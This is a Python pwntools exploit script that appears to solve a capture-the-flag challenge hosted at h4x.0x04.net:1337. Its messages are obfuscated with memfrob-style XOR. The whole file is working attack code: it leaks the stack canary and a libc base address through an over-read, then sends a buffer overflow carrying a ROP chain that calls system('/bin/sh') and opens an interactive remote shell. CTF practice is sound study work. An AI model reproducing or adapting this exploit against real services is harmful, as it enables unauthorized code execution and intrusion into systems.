#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from enum import Enum
from pwn import *

import numpy as np

A = b'a'
MAX_DATA = 0x100
FULL_DATA = A * (MAX_DATA - 1) + b'\x00'

SEND = 'Send encrypted object:\n'
DATA = 'data: '

SERVER = 'h4x.0x04.net'
PORT = 1337


class ObjType(Enum):
	READ_T = 0x0
	WRITE_T = 0x1
	APPEND_T = 0x2
	END_T = 0x3


def Obj(type, size = 0x0, data = FULL_DATA):
	return p32(type.value) + p32(size) + data


def Read(size = MAX_DATA, data = FULL_DATA):
	return Obj(ObjType.READ_T, size, data)


def Write():
	return Obj(ObjType.WRITE_T)


def Append(size = MAX_DATA, data = FULL_DATA):
	return Obj(ObjType.APPEND_T, size, data)


def End():
	return Obj(ObjType.END_T)


def memfrob(s): # glibc/string/memfrob.c
	return xor(s, 42)


class Remote(pwnlib.tubes.remote.remote):
	def __init__(self, server, port):
		super().__init__(server, port)

	def sendob(self, msg):
		return super().send(memfrob(msg))


class Exploit:
	def __init__(self, server, port):
		self.r = Remote(server, port)

	def run(self):
		data = A * 0x9
		data += self.canary()
		data += A * 0x18
		data += self.rop()

		msg = Read()
		msg += Append(len(data), data.ljust(MAX_DATA, A))
		msg += End()

		self.r.sendob(msg)
		self.r.recvn(len(2 * SEND))

		self.r.interactive()

	def tease(self, offset):
		msg = Read()
		msg += Append(offset)
		msg += Write()

		self.r.sendob(msg)
		self.r.recvuntil(DATA)
		self.r.recvn(MAX_DATA - 1 + offset)

	def canary(self):
		self.tease(0xa)

		canary = b'\x00' + self.r.recvn(0x7)

		info("canary: 0x{:016x}".format(u64(canary)))
		self.r.clean()

		return canary

	def libc(self):
		self.tease(0x29)

		libc = u64(self.r.recvn(0x6) + b'\x00\x00')
		libc -= 0x21ab0 # __libc_start_main@@GLIBC_2.2.5
		libc -= 0xf3
		libc += 0xc

		info("libc: 0x{:016x}".format(libc))
		self.r.clean()
		
		return libc

	def rop(self):
		POP_RDI = 0x2155f # pop rdi ; ret
		SYSTEM = 0x4f440 # system@@GLIBC_2.2.5
		BIN_SH = 0x1b3e9a # /bin/sh
		RET = POP_RDI + 1

		libc = self.libc()

		rop = p64(libc + RET)
		rop += p64(libc + POP_RDI)
		rop += p64(libc + BIN_SH)
		rop += p64(libc + SYSTEM)

		return rop


def main():
	Exploit(SERVER, PORT).run()


if __name__ == '__main__':
	main()
